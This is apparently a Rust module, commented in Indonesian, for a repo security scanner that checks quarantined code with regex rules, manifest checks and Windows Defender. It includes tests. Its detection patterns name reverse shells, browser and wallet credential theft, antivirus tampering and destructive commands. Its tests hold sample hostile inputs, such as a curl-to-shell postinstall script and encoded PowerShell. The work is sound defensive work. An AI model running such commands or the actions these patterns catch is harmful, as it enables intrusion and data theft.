//! Pemindai keamanan repo — dijalankan di KARANTINA sebelum repo boleh dieksekusi.
//!
//! Alur saat instalasi:
//! ```text
//! clone / ekstrak ─▶ .staging/<id>  (karantina, tidak ada yang dieksekusi)
//!                        │
//!                        ├─ 1. Analisis statis (Rust, read-only): nama file, magic bytes,
//!                        │     manifest (package.json, .npmrc, requirements.txt, .vscode/tasks.json),
//!                        │     pola kode berbahaya (download-exec, obfuscation, miner, stealer, …)
//!                        └─ 2. Windows Defender (MpCmdRun custom scan, di dalam Job Object,
//!                              -DisableRemediation sehingga file tidak diubah selama scan)
//!                        ▼
//!             verdict Clean  → repo dipindah ke workspace, boleh di-Start
//!             verdict Suspicious → tetap dipindah (agar bisa ditinjau/dihapus), tetapi
//!                                  Start DIBLOKIR + note "Repo ini terdeteksi tidak normal"
//! ```
//!
//! Aturan verdict: `Suspicious` jika ada ≥ 1 temuan **High**, atau ≥ 3 jenis aturan **Medium**.
//! Ini heuristik — bisa ada false positive/negative. Scan TIDAK menggantikan review manual
//! untuk repo yang benar-benar tidak dikenal.

use std::{
    collections::{HashMap, HashSet},
    fs::File,
    io::Read,
    path::{Path, PathBuf},
    sync::LazyLock,
    thread,
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};

use regex::{Regex, RegexSet};
use serde_json::Value;
use walkdir::WalkDir;

use super::{fsutil::read_small, sandbox};
use crate::engine::types::{ScanFinding, ScanReport, ScanVerdict, Severity};

pub const SUSPICIOUS_NOTE: &str = "Repo ini terdeteksi tidak normal";

const MAX_FILES: usize = 100_000;
const MAX_TEXT_BYTES: u64 = 1024 * 1024;
const MAX_TOTAL_TEXT: u64 = 256 * 1024 * 1024;
const MAX_FINDINGS_PER_RULE: usize = 5;
const MEDIUM_RULES_FOR_SUSPICIOUS: usize = 3;
const DEFENDER_TIMEOUT: Duration = Duration::from_secs(180);

/// Dependensi & artefak build tidak dipindai isinya (sumbernya registry, bukan author repo,
/// dan sarat false positive). node_modules bawaan arsip tetap ditandai terpisah.
const SKIP_DIRS: &[&str] = &[".git", "node_modules", ".venv", "venv", "target", "__pycache__", ".next", "dist-cache"];

const TEXT_EXT: &[&str] = &[
    "js", "mjs", "cjs", "ts", "mts", "cts", "tsx", "jsx", "vue", "svelte", "py", "pyw", "rs", "go",
    "json", "sh", "bash", "zsh", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "vbe", "wsf", "hta",
    "toml", "yml", "yaml", "html", "htm", "php", "rb", "java", "kt", "cs", "c", "cc", "cpp", "h",
    "lua", "pl", "env", "npmrc", "cfg", "ini",
];
/// Ekstensi yang memang sah berisi PE (header "MZ").
const PE_EXT: &[&str] = &["exe", "dll", "sys", "scr", "com", "ocx", "cpl", "node", "pyd", "efi", "mui", "winmd", "drv"];
/// Jenis file skrip Windows yang jarang ada di repo sumber normal.
const RISKY_EXT: &[&str] = &["vbs", "vbe", "wsf", "wsh", "hta", "scr", "pif", "lnk", "jse", "msc"];
const BINARY_EXT: &[&str] = &["exe", "dll", "msi", "jar", "sys"];

const NPM_LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare", "prepublish", "preuninstall", "uninstall", "postuninstall"];
const NPM_RUN: &[&str] = &["dev", "start", "serve", "preview", "predev", "prestart", "preserve", "prepreview"];

// ───────────────────────────── Aturan konten ─────────────────────────────

struct Rule {
    id: &'static str,
    severity: Severity,
    title: &'static str,
    pattern: &'static str,
}

const CONTENT_RULES: &[Rule] = &[
    Rule { id: "ps_encoded", severity: Severity::High,
        title: "PowerShell dengan perintah ter-encode (base64)",
        pattern: r"(?i)\b(powershell|pwsh)(\.exe)?\b[^\n]{0,120}\s-(e|en|enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}" },
    Rule { id: "ps_download_exec", severity: Severity::High,
        title: "Unduh-lalu-eksekusi via PowerShell",
        pattern: r"(?i)\b(iex|invoke-expression)\b[\s(]{0,4}(new-object\s+(system\.)?net\.webclient|iwr|irm|invoke-webrequest|invoke-restmethod)|downloadstring\s*\(" },
    Rule { id: "lolbin", severity: Severity::High,
        title: "LOLBin Windows untuk mengunduh/menjalankan payload",
        pattern: r"(?i)\bcertutil(\.exe)?\s[^\n]*-urlcache|\bbitsadmin(\.exe)?\s[^\n]*/transfer|\bmshta(\.exe)?\s+[^\n]*https?:|\bregsvr32(\.exe)?\s[^\n]*/i:https?:|\brundll32(\.exe)?\s[^\n]*javascript:" },
    Rule { id: "pipe_to_shell", severity: Severity::High,
        title: "Output curl/wget langsung dieksekusi shell",
        pattern: r"(?i)\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b" },
    Rule { id: "obfuscated_exec", severity: Severity::High,
        title: "Eksekusi kode yang di-encode/di-obfuscate",
        pattern: r"(?i)\b(eval|Function|exec|execSync)\s*\(\s*(atob|Buffer\.from|base64\.b64decode|codecs\.decode|zlib\.decompress|bytes\.fromhex|marshal\.loads)\s*\(" },
    Rule { id: "crypto_miner", severity: Severity::High,
        title: "Indikasi crypto-miner",
        pattern: r"(?i)stratum\+(tcp|ssl)://|\bxmrig\b|coinhive|cryptonight|\bminexmr\b|\bnanopool\.org\b" },
    Rule { id: "credential_theft", severity: Severity::High,
        title: "Akses ke data kredensial browser / wallet",
        pattern: r"(?i)(Login Data|Local State|Web Data)[^\n]{0,160}(Chrome|Edge|Brave|Opera|Chromium)|(Google\\\\?Chrome|Microsoft\\\\?Edge|BraveSoftware)[^\n]{0,160}(Login Data|Local State|Web Data)|\bwallet\.dat\b|Exodus[\\/]+exodus\.wallet|Discord[\\/]+Local Storage[\\/]+leveldb" },
    Rule { id: "reverse_shell", severity: Severity::High,
        title: "Pola reverse shell",
        pattern: r"(?i)bash\s+-i\s*>&\s*/dev/tcp/|\bnc(at)?(\.exe)?\s[^\n]*-e\s+(/bin/(ba)?sh|cmd(\.exe)?)|pty\.spawn\(\s*['\x22]/bin/(ba)?sh|New-Object\s+System\.Net\.Sockets\.TCPClient" },
    Rule { id: "persistence", severity: Severity::High,
        title: "Mekanisme autostart / persistence Windows",
        pattern: r"(?i)CurrentVersion\\{1,2}Run(Once)?\b|\bschtasks(\.exe)?\s+/create\b|\\Start Menu\\{1,2}Programs\\{1,2}Startup|shell:startup" },
    Rule { id: "av_tamper", severity: Severity::High,
        title: "Mematikan antivirus / menghapus jejak",
        pattern: r"(?i)\b(Set|Add)-MpPreference\b|DisableRealtimeMonitoring|\bvssadmin(\.exe)?\s+delete\s+shadows|\bwevtutil(\.exe)?\s+cl\b|\bbcdedit(\.exe)?\s+/set\b" },
    Rule { id: "destructive", severity: Severity::High,
        title: "Perintah destruktif pada sistem",
        pattern: r"(?im)\brm\s+-rf\s+(--no-preserve-root\s+)?/(\s|$|\*)|\bformat(\.com)?\s+[a-z]:\s*/[qyx]|\brd\s+/s\s+/q\s+[a-z]:\\\s*$|\bcipher(\.exe)?\s+/w:|\bdel\s+/[fsq]\s+/[fsq][^\n]*\b[a-z]:\\\s*\*" },
    Rule { id: "exfil_webhook", severity: Severity::Medium,
        title: "Webhook Discord/Telegram (sering dipakai untuk eksfiltrasi)",
        pattern: r"(?i)discord(app)?\.com/api/webhooks/\d+|api\.telegram\.org/bot\d+:" },
    Rule { id: "raw_ip_url", severity: Severity::Medium,
        title: "URL ke alamat IP mentah",
        pattern: r"\bhttps?://(25[0-5]|2[0-4]\d|1?\d?\d)(\.(25[0-5]|2[0-4]\d|1?\d?\d)){3}(:\d+)?/" },
    Rule { id: "ssh_key_access", severity: Severity::Medium,
        title: "Membaca private key SSH",
        pattern: r"(?i)\.ssh[\\/]+id_(rsa|ed25519|ecdsa)\b" },
];

static CONTENT_SET: LazyLock<RegexSet> =
    LazyLock::new(|| RegexSet::new(CONTENT_RULES.iter().map(|r| r.pattern)).expect("regex rule valid"));
static CONTENT_RES: LazyLock<Vec<Regex>> =
    LazyLock::new(|| CONTENT_RULES.iter().map(|r| Regex::new(r.pattern).expect("regex rule valid")).collect());

static RE_LONG_BASE64: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{3000,}={0,2}").unwrap());
static RE_OBFUSCATOR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b_0x[a-f0-9]{4,6}\b").unwrap());
static RE_DOUBLE_EXT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|txt|zip|rar|mp4|mp3)\.(exe|scr|bat|cmd|com|pif|vbs|js|jse|lnk|hta|msi|ps1)$").unwrap()
});
static RE_NET_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(curl|wget|powershell|pwsh|iwr|irm|invoke-webrequest|invoke-restmethod|certutil|bitsadmin|mshta)\b|\bnode\s+-e\b|\bpython3?\s+-c\b|https?://|\bbase64\b|\beval\b").unwrap()
});
static RE_RUN_SUSPICIOUS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(curl|wget|powershell|pwsh|iwr|irm|invoke-webrequest|certutil|bitsadmin|mshta|regsvr32|schtasks)\b|\breg\s+add\b|\s-enc(odedcommand)?\s|\|\s*(ba)?sh\b").unwrap()
});
static RE_DEP_URL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^(https?:|git\+|git:|github:|gitlab:|bitbucket:)|\.tgz$").unwrap());
static RE_REGISTRY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?im)^\s*(?:@[^:\s]+:)?(?:registry|npmRegistryServer)\s*[=:]\s*["']?([^\s"']+)"#).unwrap()
});
static RE_PIP_INDEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?im)^\s*(--index-url|--extra-index-url|-i\s|--trusted-host|-f\s|--find-links)").unwrap());
static RE_PIP_URL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?im)^\s*[^#\s]*(git\+|https?://)").unwrap());
static RE_VSCODE_AUTORUN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)"runOn"\s*:\s*"folderOpen""#).unwrap());

// ───────────────────────────── Kolektor temuan ─────────────────────────────

#[derive(Default)]
struct Collector {
    findings: Vec<ScanFinding>,
    per_rule: HashMap<&'static str, usize>,
}

impl Collector {
    fn add(&mut self, severity: Severity, rule: &'static str, title: &str, file: Option<&str>, line: Option<u32>, detail: impl Into<String>) {
        let n = self.per_rule.entry(rule).or_default();
        *n += 1;
        if *n > MAX_FINDINGS_PER_RULE {
            return;
        }
        self.findings.push(ScanFinding {
            severity,
            rule: rule.to_string(),
            title: title.to_string(),
            file: file.map(str::to_string),
            line,
            detail: detail.into(),
        });
    }
}

pub struct ScanOptions {
    /// Sertakan Windows Defender.
    pub antivirus: bool,
    /// `true` saat instalasi (repo masih mentah dari author) — mengaktifkan cek node_modules bawaan.
    pub install_time: bool,
}

/// Memindai `root` tanpa mengeksekusi apa pun dari repo.
pub fn scan_repo(root: &Path, opts: &ScanOptions) -> ScanReport {
    let mut c = Collector::default();

    if opts.install_time && root.join("node_modules").is_dir() {
        c.add(Severity::Medium, "bundled_node_modules", "Arsip menyertakan node_modules",
            Some("node_modules"), None,
            "Dependensi dibawa langsung oleh author, bukan diunduh dari registry — isinya tidak terverifikasi.");
    }
    scan_manifests(root, &mut c);

    let mut scanned: u32 = 0;
    let mut text_budget = MAX_TOTAL_TEXT;
    let mut binaries: Vec<String> = Vec::new();

    let walker = WalkDir::new(root).follow_links(false).into_iter().filter_entry(|e| {
        !(e.file_type().is_dir() && e.depth() > 0 && e.file_name().to_str().is_some_and(|n| SKIP_DIRS.contains(&n)))
    });
    for entry in walker.filter_map(Result::ok) {
        if !entry.file_type().is_file() {
            continue;
        }
        scanned += 1;
        if scanned as usize > MAX_FILES {
            c.add(Severity::Info, "file_limit", "Batas jumlah file tercapai", None, None,
                format!("Hanya {MAX_FILES} file pertama yang dipindai."));
            break;
        }
        let rel = rel_path(root, entry.path());
        let name = entry.file_name().to_string_lossy();
        let ext = Path::new(name.as_ref()).extension().and_then(|e| e.to_str()).map(str::to_ascii_lowercase).unwrap_or_default();

        check_filename(&rel, &name, &ext, &mut c);
        if BINARY_EXT.contains(&ext.as_str()) {
            binaries.push(rel.clone());
        }
        let len = entry.metadata().map_or(0, |m| m.len());
        check_content(entry.path(), &rel, &name, &ext, len, &mut text_budget, &mut c);
    }

    if !binaries.is_empty() {
        c.add(Severity::Info, "binaries", "Repo berisi file biner", Some(&binaries[0]), None,
            format!("{} file .exe/.dll/.msi/.jar/.sys ditemukan (tidak dijalankan oleh RepoLaunch).", binaries.len()));
    }

    let antivirus = if opts.antivirus { defender_scan(root, &mut c) } else { "Dilewati (nonaktif di pengaturan)".to_string() };
    finalize(c, scanned, antivirus)
}

fn rel_path(root: &Path, path: &Path) -> String {
    path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/")
}

fn check_filename(rel: &str, name: &str, ext: &str, c: &mut Collector) {
    if name.contains('\u{202E}') {
        c.add(Severity::High, "rtlo_filename", "Nama file memakai karakter RTL-override (penyamaran ekstensi)", Some(rel), None, "U+202E dalam nama file");
    }
    if RE_DOUBLE_EXT.is_match(name) {
        c.add(Severity::High, "double_extension", "Ekstensi ganda yang menyamarkan executable", Some(rel), None, name.to_string());
    }
    if RISKY_EXT.contains(&ext) {
        c.add(Severity::Medium, "risky_script_type", "Jenis file skrip Windows yang tidak lazim di repo", Some(rel), None, format!(".{ext}"));
    }
}

fn check_content(path: &Path, rel: &str, name: &str, ext: &str, len: u64, budget: &mut u64, c: &mut Collector) {
    let Ok(file) = File::open(path) else { return };
    let mut buf = Vec::with_capacity(len.min(MAX_TEXT_BYTES) as usize);
    if file.take(MAX_TEXT_BYTES).read_to_end(&mut buf).is_err() {
        return;
    }

    // Executable Windows yang disamarkan (header MZ pada ekstensi non-PE).
    if buf.len() >= 64 && buf.starts_with(b"MZ") && !PE_EXT.contains(&ext) {
        let pe_off = u32::from_le_bytes([buf[60], buf[61], buf[62], buf[63]]) as usize;
        if buf.get(pe_off..pe_off + 4) == Some(b"PE\0\0") {
            c.add(Severity::High, "disguised_pe", "Executable Windows disamarkan dengan ekstensi lain", Some(rel), None,
                format!("'{name}' berisi program .exe"));
        }
    }

    let is_text = TEXT_EXT.contains(&ext) || name.starts_with(".env") || matches!(name, "Dockerfile" | "Makefile" | ".npmrc");
    if !is_text || *budget < buf.len() as u64 {
        return;
    }
    if buf.iter().take(8192).any(|b| *b == 0) {
        return; // biner
    }
    *budget -= buf.len() as u64;
    let text = String::from_utf8_lossy(&buf);

    for idx in CONTENT_SET.matches(&text).into_iter() {
        let rule = &CONTENT_RULES[idx];
        if let Some(m) = CONTENT_RES[idx].find(&text) {
            let (line, snippet) = locate(&text, m.start());
            c.add(rule.severity, rule.id, rule.title, Some(rel), Some(line), snippet);
        }
    }

    // Heuristik obfuscation (dilewati untuk bundle minified / sourcemap / lockfile).
    let generated = name.ends_with(".min.js") || name.ends_with(".map") || name.contains("lock") || rel.contains("/dist/") || rel.contains("/build/");
    if !generated {
        if let Some(m) = RE_LONG_BASE64.find(&text) {
            let (line, _) = locate(&text, m.start());
            c.add(Severity::Medium, "long_base64", "Blob base64 sangat panjang di dalam kode", Some(rel), Some(line),
                format!("{} karakter", m.len()));
        }
        if RE_OBFUSCATOR.find_iter(&text).take(30).count() >= 30 {
            c.add(Severity::Medium, "obfuscated_js", "Kode ter-obfuscate (pola _0x…)", Some(rel), None, "≥ 30 identifier _0xXXXX");
        }
    }
}

/// (nomor baris 1-based, potongan baris ≤ 140 karakter).
fn locate(text: &str, offset: usize) -> (u32, String) {
    let line = text[..offset].bytes().filter(|b| *b == b'\n').count() as u32 + 1;
    let start = text[..offset].rfind('\n').map_or(0, |i| i + 1);
    let end = text[offset..].find('\n').map_or(text.len(), |i| offset + i);
    let snippet: String = text[start..end].trim().chars().take(140).collect();
    (line, snippet)
}

// ───────────────────────────── Manifest ─────────────────────────────

fn scan_manifests(root: &Path, c: &mut Collector) {
    if let Some(pkg) = read_small(&root.join("package.json"), MAX_TEXT_BYTES).and_then(|s| serde_json::from_str::<Value>(&s).ok()) {
        if let Some(scripts) = pkg.get("scripts").and_then(Value::as_object) {
            for (name, cmd) in scripts {
                let Some(cmd) = cmd.as_str() else { continue };
                let detail = format!("\"{name}\": \"{}\"", cmd.chars().take(140).collect::<String>());
                if NPM_LIFECYCLE.contains(&name.as_str()) {
                    if RE_NET_EXEC.is_match(cmd) {
                        c.add(Severity::High, "npm_lifecycle_exec", "Script instalasi npm melakukan akses jaringan / eksekusi dinamis",
                            Some("package.json"), None, detail);
                    } else {
                        c.add(Severity::Info, "npm_lifecycle", "Ada script lifecycle npm (tidak dijalankan: --ignore-scripts)",
                            Some("package.json"), None, detail);
                    }
                } else if NPM_RUN.contains(&name.as_str()) && RE_RUN_SUSPICIOUS.is_match(cmd) {
                    c.add(Severity::High, "npm_run_suspicious", "Script yang akan dijalankan memuat perintah mencurigakan",
                        Some("package.json"), None, detail);
                }
            }
        }
        for section in ["dependencies", "devDependencies", "optionalDependencies"] {
            let Some(deps) = pkg.get(section).and_then(Value::as_object) else { continue };
            for (dep, spec) in deps {
                if spec.as_str().is_some_and(|s| RE_DEP_URL.is_match(s)) {
                    c.add(Severity::Medium, "dep_from_url", "Dependensi diambil dari URL, bukan registry npm",
                        Some("package.json"), None, format!("{dep}: {}", spec.as_str().unwrap_or_default()));
                }
            }
        }
    }

    for f in [".npmrc", ".yarnrc", ".yarnrc.yml"] {
        let Some(text) = read_small(&root.join(f), MAX_TEXT_BYTES) else { continue };
        for cap in RE_REGISTRY.captures_iter(&text) {
            let url = &cap[1];
            if !url.contains("registry.npmjs.org") && !url.contains("registry.yarnpkg.com") {
                c.add(Severity::Medium, "custom_registry", "Registry paket diganti ke server lain", Some(f), None, url.to_string());
            }
        }
    }

    if let Some(req) = read_small(&root.join("requirements.txt"), MAX_TEXT_BYTES) {
        if let Some(m) = RE_PIP_INDEX.find(&req) {
            let (line, snippet) = locate(&req, m.start());
            c.add(Severity::Medium, "pip_custom_index", "Index paket pip diganti ke server lain", Some("requirements.txt"), Some(line), snippet);
        }
        if let Some(m) = RE_PIP_URL.find(&req) {
            let (line, snippet) = locate(&req, m.start());
            c.add(Severity::Medium, "pip_url_dependency", "Dependensi pip diambil dari URL", Some("requirements.txt"), Some(line), snippet);
        }
    }

    // Vektor malware nyata: task VS Code yang otomatis jalan saat folder dibuka.
    if let Some(tasks) = read_small(&root.join(".vscode").join("tasks.json"), MAX_TEXT_BYTES) {
        if RE_VSCODE_AUTORUN.is_match(&tasks) {
            c.add(Severity::High, "vscode_autorun", "Task VS Code otomatis berjalan saat folder dibuka",
                Some(".vscode/tasks.json"), None, "\"runOn\": \"folderOpen\"");
        }
    }
}

// ───────────────────────────── Windows Defender ─────────────────────────────

fn defender_scan(root: &Path, c: &mut Collector) -> String {
    let base = std::env::var_os("ProgramFiles").map_or_else(|| PathBuf::from(r"C:\Program Files"), PathBuf::from);
    let exe = base.join("Windows Defender").join("MpCmdRun.exe");
    if !exe.is_file() {
        return "Windows Defender tidak tersedia".into();
    }
    // MpCmdRun tidak menerima path verbatim (\\?\C:\...).
    let target = root.to_string_lossy().trim_start_matches(r"\\?\").to_string();
    let args = ["-Scan", "-ScanType", "3", "-File", target.as_str(), "-DisableRemediation"];

    let mut child = match sandbox::spawn_system(&exe, &args) {
        Ok(ch) => ch,
        Err(e) => return format!("Windows Defender gagal dijalankan: {e:#}"),
    };
    let deadline = Instant::now() + DEFENDER_TIMEOUT;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                return match status.code() {
                    Some(0) => "Windows Defender: tidak ada ancaman".into(),
                    Some(2) => {
                        c.add(Severity::High, "defender_threat", "Windows Defender mendeteksi ancaman", None, None,
                            "Detail: Windows Security → Perlindungan virus & ancaman → Riwayat perlindungan.");
                        "Windows Defender: ANCAMAN terdeteksi".into()
                    }
                    code => format!("Windows Defender tidak dapat memindai (kode {code:?}); mungkin digantikan antivirus lain"),
                };
            }
            Ok(None) if Instant::now() >= deadline => {
                child.terminate();
                return format!("Windows Defender: timeout setelah {} detik", DEFENDER_TIMEOUT.as_secs());
            }
            Ok(None) => thread::sleep(Duration::from_millis(500)),
            Err(e) => return format!("Windows Defender: {e}"),
        }
    }
}

// ───────────────────────────── Verdict ─────────────────────────────

fn finalize(c: Collector, scanned: u32, antivirus: String) -> ScanReport {
    let mut findings = c.findings;
    findings.sort_by(|a, b| b.severity.cmp(&a.severity));

    let high = findings.iter().filter(|f| f.severity == Severity::High).count();
    let medium_rules: HashSet<&str> =
        findings.iter().filter(|f| f.severity == Severity::Medium).map(|f| f.rule.as_str()).collect();
    let medium = findings.iter().filter(|f| f.severity == Severity::Medium).count();

    let suspicious = high > 0 || medium_rules.len() >= MEDIUM_RULES_FOR_SUSPICIOUS;
    let summary = match (high, medium) {
        (0, 0) => "Tidak ditemukan indikasi berbahaya".to_string(),
        (0, m) => format!("{m} temuan tingkat sedang"),
        (h, 0) => format!("{h} temuan berisiko tinggi"),
        (h, m) => format!("{h} temuan berisiko tinggi, {m} sedang"),
    };

    ScanReport {
        verdict: if suspicious { ScanVerdict::Suspicious } else { ScanVerdict::Clean },
        summary,
        note: suspicious.then(|| SUSPICIOUS_NOTE.to_string()),
        findings,
        scanned_files: scanned,
        antivirus,
        scanned_at: SystemTime::now().duration_since(UNIX_EPOCH).map_or(0, |d| d.as_secs() as i64),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    const NO_AV: ScanOptions = ScanOptions { antivirus: false, install_time: true };

    fn repo(files: &[(&str, &[u8])]) -> tempfile::TempDir {
        let d = tempfile::tempdir().unwrap();
        for (path, body) in files {
            let p = d.path().join(path);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, body).unwrap();
        }
        d
    }

    #[test]
    fn clean_repo_passes() {
        let d = repo(&[
            ("package.json", br#"{"scripts":{"dev":"vite"},"dependencies":{"react":"^18.0.0"}}"#),
            ("src/main.js", b"console.log('hello');\nfetch('http://localhost:3000/api');\n"),
        ]);
        let r = scan_repo(d.path(), &NO_AV);
        assert_eq!(r.verdict, ScanVerdict::Clean, "{:?}", r.findings);
        assert!(r.note.is_none());
    }

    #[test]
    fn flags_malicious_postinstall() {
        let d = repo(&[("package.json", br#"{"scripts":{"postinstall":"curl http://1.2.3.4/x.sh | sh"}}"#)]);
        let r = scan_repo(d.path(), &NO_AV);
        assert_eq!(r.verdict, ScanVerdict::Suspicious);
        assert_eq!(r.note.as_deref(), Some(SUSPICIOUS_NOTE));
        assert!(r.findings.iter().any(|f| f.rule == "npm_lifecycle_exec"));
    }

    #[test]
    fn flags_encoded_powershell_and_obfuscated_eval() {
        let d = repo(&[
            ("setup.bat", b"powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n"),
            ("lib/a.js", b"const x = 1;\neval(atob('Y29uc29sZS5sb2coMSk='));\n"),
        ]);
        let r = scan_repo(d.path(), &NO_AV);
        assert!(r.findings.iter().any(|f| f.rule == "ps_encoded"));
        let eval = r.findings.iter().find(|f| f.rule == "obfuscated_exec").unwrap();
        assert_eq!(eval.line, Some(2));
    }

    #[test]
    fn flags_disguised_executable() {
        let mut pe = vec![0u8; 256];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[60] = 128;
        pe[128..132].copy_from_slice(b"PE\0\0");
        let d = repo(&[("assets/logo.png", &pe)]);
        let r = scan_repo(d.path(), &NO_AV);
        assert!(r.findings.iter().any(|f| f.rule == "disguised_pe" && f.severity == Severity::High));
    }

    #[test]
    fn flags_vscode_autorun_task() {
        let d = repo(&[(".vscode/tasks.json", br#"{"tasks":[{"label":"x","runOptions":{"runOn":"folderOpen"}}]}"#)]);
        assert_eq!(scan_repo(d.path(), &NO_AV).verdict, ScanVerdict::Suspicious);
    }

    #[test]
    fn single_medium_is_not_suspicious() {
        let d = repo(&[("notify.py", b"URL = 'https://discord.com/api/webhooks/123/abc'\n")]);
        let r = scan_repo(d.path(), &NO_AV);
        assert_eq!(r.verdict, ScanVerdict::Clean);
        assert_eq!(r.findings.len(), 1);
    }
}
